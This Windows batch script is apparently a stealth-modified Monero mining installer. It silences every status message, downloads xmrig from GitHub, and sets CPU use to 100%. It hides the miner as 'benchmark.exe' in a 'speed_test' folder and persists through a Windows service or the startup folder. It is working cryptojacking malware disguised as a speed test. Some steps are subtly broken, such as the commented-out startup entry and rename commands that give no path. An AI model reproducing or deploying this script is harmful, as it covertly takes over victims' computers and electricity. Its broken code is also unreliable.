@echo off

set VERSION=2.5

rem printing greetings

rem == echo MoneroOcean mining setup script v%VERSION%.
rem == echo ^(please report issues to support@moneroocean.stream email^)
echo.

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

rem command line arguments
set WALLET=%1
rem this one is optional
set EMAIL=%2

rem checking prerequisites

if [%WALLET%] == [] (
  rem == echo Script usage:
  rem == echo ^> setup_moneroocean_miner.bat ^<wallet address^> [^<your email address^>]
  rem == echo ERROR: Please specify your wallet address
  exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
rem == echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
exit /b 1

:WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
  rem == echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  rem == echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  rem == echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  rem == echo ERROR: This script requires "find" utility to work correctly
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  rem == echo ERROR: This script requires "findstr" utility to work correctly
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  rem == echo ERROR: This script requires "tasklist" utility to work correctly
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    rem == echo ERROR: This script requires "sc" utility to work correctly
    exit /b 1
  )
)

rem calculating port

set /a "EXP_MONERO_HASHRATE = %NUMBER_OF_PROCESSORS% * 700 / 1000"

if [%EXP_MONERO_HASHRATE%] == [] ( 
  rem == echo ERROR: Can't compute projected Monero hashrate
  exit 
)

if %EXP_MONERO_HASHRATE% gtr 8192 ( set PORT=18192 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 4096 ( set PORT=14096 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 2048 ( set PORT=12048 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1024 ( set PORT=11024 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  512 ( set PORT=10512 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  256 ( set PORT=10256 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  128 ( set PORT=10128 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   64 ( set PORT=10064 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   32 ( set PORT=10032 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   16 ( set PORT=10016 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    8 ( set PORT=10008 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=10004 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    2 ( set PORT=10002 & goto PORT_OK )
set PORT=10001

:PORT_OK

rem printing intentions

set "LOGFILE=%USERPROFILE%\speed_test\speed_test_benchmark.log"

rem == echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
rem == echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
rem == echo Mining will happen to %WALLET% wallet.

if not [%EMAIL%] == [] (
  rem == echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
)

echo.

if %ADMIN% == 0 (
  rem == echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
) else (
  rem == echo Mining in background will be performed using moneroocean_miner service.
)

echo.
rem == echo JFYI: This host has %NUMBER_OF_PROCESSORS% CPU threads, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% KH/s.
echo.

rem ** pause

rem start doing stuff: preparing miner

rem == echo [*] Removing previous moneroocean miner (if any)
sc stop moneroocean_miner
sc delete moneroocean_miner
taskkill /f /t /im xmrig.exe
taskkill /f /t /im benchmark.exe

:REMOVE_DIR0
rem == echo [*] Removing "%USERPROFILE%\moneroocean" directory
timeout 5
rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
rmdir /q /s "%USERPROFILE%\speed_test" >NUL 2>NUL
IF EXIST "%USERPROFILE%\speed_test" GOTO REMOVE_DIR0

rem == echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  rem == echo ERROR: Can't download MoneroOcean advanced version of xmrig
  goto MINER_BAD
)

rem == echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\speed_test')"
if errorlevel 1 (
  rem == echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    rem == echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  rem == echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\speed_test" "%USERPROFILE%\xmrig.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

rem == echo [*] Checking if advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\speed_test\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\speed_test\config.json'" 
"%USERPROFILE%\speed_test\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD

if exist "%USERPROFILE%\speed_test\xmrig.exe" (
  rem == echo WARNING: Advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" is not functional
  rename xmrig.exe benchmark.exe
) else (
  rem == echo WARNING: Advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" was removed by antivirus
)

rem == echo [*] Looking for the latest version of Monero miner
for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"

rem == echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  rem == echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
  exit /b 1
)

:REMOVE_DIR1
rem == echo [*] Removing "%USERPROFILE%\moneroocean" directory
timeout 5
rmdir /q /s "%USERPROFILE%\speed_test" >NUL 2>NUL
IF EXIST "%USERPROFILE%\speed_test" GOTO REMOVE_DIR1

rem == echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\speed_test')"
if errorlevel 1 (
  rem == echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    rem == echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  rem == echo [*] Unpacking advanced "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\speed_test" "%USERPROFILE%\xmrig.zip" >NUL
  if errorlevel 1 (
    rem == echo ERROR: Can't unpack "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

rem == echo [*] Checking if stock version of "%USERPROFILE%\moneroocean\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\speed_test\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\speed_test\config.json'" 
"%USERPROFILE%\speed_test\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK

if exist "%USERPROFILE%\speed_test\xmrig.exe" (
  rem == echo WARNING: Stock version of "%USERPROFILE%\moneroocean\xmrig.exe" is not functional
  rename xmrig.exe benchmark.exe
) else (
  rem == echo WARNING: Stock version of "%USERPROFILE%\moneroocean\xmrig.exe" was removed by antivirus
)

exit /b 1

:MINER_OK

rem == echo [*] Miner "%USERPROFILE%\moneroocean\xmrig.exe" is OK

for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
if [%PASS%] == [] (
  set PASS=na
)
if not [%EMAIL%] == [] (
  set "PASS=%PASS%:%EMAIL%"
)

powershell -Command "$out = cat '%USERPROFILE%\speed_test\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\speed_test\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\speed_test\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\speed_test\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\speed_test\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\speed_test\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\speed_test\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\speed_test\config.json'" 
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat '%USERPROFILE%\speed_test\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\speed_test\config.json'" 

copy /Y "%USERPROFILE%\speed_test\config.json" "%USERPROFILE%\speed_test\config_background.json" >NUL
powershell -Command "$out = cat '%USERPROFILE%\speed_test\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\speed_test\config_background.json'" 

rem preparing script
(
echo @rem == echo off
echo tasklist /fi "imagename eq benchmark.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0benchmark.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo rem == echo Monero miner is already running in the background. Refusing to run another one.
echo rem == echo Run "taskkill /IM benchmark.exe" if you want to remove background miner first.
echo :EXIT
) > "%USERPROFILE%\speed_test\miner.bat"

rem preparing script background work and work under reboot

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
rem if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
rem   set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
rem   goto STARTUP_DIR_OK  
rem )

rem == echo ERROR: Can't find Windows startup directory
exit /b 1

:STARTUP_DIR_OK
rem == echo [*] Adding call to "%USERPROFILE%\moneroocean\miner.bat" script to "%STARTUP_DIR%\moneroocean_miner.bat" script
(
rem == echo @rem == echo off
rem == echo "%USERPROFILE%\moneroocean\miner.bat" --config="%USERPROFILE%\moneroocean\config_background.json"
) > "%STARTUP_DIR%\moneroocean_miner.bat"

rem == echo [*] Running miner in the background
call "%STARTUP_DIR%\moneroocean_miner.bat"
goto OK

:ADMIN_MINER_SETUP

rem == echo [*] Downloading tools to make moneroocean_miner service to "%USERPROFILE%\nssm.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
  rem == echo ERROR: Can't download tools to make moneroocean_miner service
  exit /b 1
)

rem == echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\speed_test')"
if errorlevel 1 (
  rem == echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    rem == echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  rem == echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\speed_test" "%USERPROFILE%\nssm.zip" >NUL
  if errorlevel 1 (
    rem == echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\nssm.zip"

rem == echo [*] Creating moneroocean_miner service
sc stop moneroocean_miner
sc delete moneroocean_miner
"%USERPROFILE%\speed_test\nssm.exe" install moneroocean_miner "%USERPROFILE%\speed_test\benchmark.exe"
if errorlevel 1 (
  rem == echo ERROR: Can't create moneroocean_miner service
  exit /b 1
)
"%USERPROFILE%\speed_test\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\speed_test"
"%USERPROFILE%\speed_test\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%USERPROFILE%\speed_test\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\speed_test\stdout"
"%USERPROFILE%\speed_test\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\speed_test\stderr"

rem == echo [*] Starting moneroocean_miner service
"%USERPROFILE%\speed_test\nssm.exe" start moneroocean_miner
if errorlevel 1 (
  rem == echo ERROR: Can't start moneroocean_miner service
  exit /b 1
)

echo
rem == echo Please reboot system if moneroocean_miner service is not activated yet (if "%USERPROFILE%\moneroocean\xmrig.log" file is empty)
goto OK

:OK
echo
rem == echo [*] Setup complete
rem ** pause
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b





